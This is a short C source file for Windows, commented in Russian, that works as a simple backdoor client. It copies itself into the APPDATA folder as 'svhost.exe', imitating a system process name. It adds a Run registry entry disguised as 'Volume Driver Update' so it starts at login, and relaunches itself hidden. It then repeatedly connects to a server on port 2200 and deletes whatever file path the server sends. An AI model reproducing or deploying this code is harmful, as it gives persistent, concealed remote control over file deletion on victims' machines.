#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#define PORT "2200"
#define MAX_MSG 256

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <shellapi.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#pragma comment(lib, "Ws2_32.lib")

SOCKET s = INVALID_SOCKET;
WSADATA wsadata;
ADDRINFO hints;
ADDRINFO* result;

void main() {
	char* sendbuf = "hello from client";
	char recvbuf[MAX_MSG];
	

	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	
	//копирование, автозагрузка и запуск

	char cur_file[MAX_PATH] = { 0 };
	GetModuleFileNameA(NULL, cur_file, MAX_PATH);
	
	char* path_to_appdata;
	size_t len_p_t_a = 0;
	_dupenv_s(&path_to_appdata, &len_p_t_a, "APPDATA");	//поиск переменных окружения
	char new_file[MAX_PATH] = {""};
	strcpy(new_file, path_to_appdata);
	strcpy(&(new_file[(int)len_p_t_a - 1]), "\\svhost.exe");
	if (strcmp(cur_file, new_file)) {
		if (CopyFileA(cur_file, new_file, FALSE)) {		//false - перезапись
			HKEY reg_key;
			RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &reg_key);
			RegSetValueExA(reg_key, "Volume Driver Update", 0, REG_SZ, (BYTE*)new_file, strlen(new_file) + 1);	//+1 для зав. нуля
			RegCloseKey(reg_key);
			ShellExecuteA(NULL, "open", new_file, NULL, NULL, SW_HIDE);
			exit(0);
		}
	}

	WSAStartup(MAKEWORD(2, 2), &wsadata);	//передача инфы по системе библиотеке/компилятору
	getaddrinfo("localhost", PORT, &hints, &result);	//раб-ет как переводчик для сокетов (преобразование различных данных)

	while (1) {
		s = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
		connect(s, result->ai_addr, (int)result->ai_addrlen);
		send(s, sendbuf, (int)strlen(sendbuf), 0);
		int r_bytes;
		do {
			memset(recvbuf, 0, MAX_MSG);
			r_bytes = recv(s, recvbuf, (int)MAX_MSG, 0);
			if (r_bytes > 0) {
				printf("%d BYTES RECEIVED!\n", r_bytes);
				printf("MSG: %s\n", recvbuf);
				if (GetFileAttributesA(recvbuf) == INVALID_FILE_ATTRIBUTES) {
					send(s, "There is no such file", 23, 0);
				}
				else {
					if (DeleteFileA(recvbuf))
						send(s, "The file has been successfully deleted", 39, 0);
					else
						send(s, "~err: delete file failed", 25, 0);
				};
			}
			else if (r_bytes == 0) printf("Connecton closed!\n");
			else break;
		} while (r_bytes > 0);
		closesocket(s);
		Sleep(10000);	//ожидание 10 сек
	}

	//очистка
	freeaddrinfo(result);
	WSACleanup();

}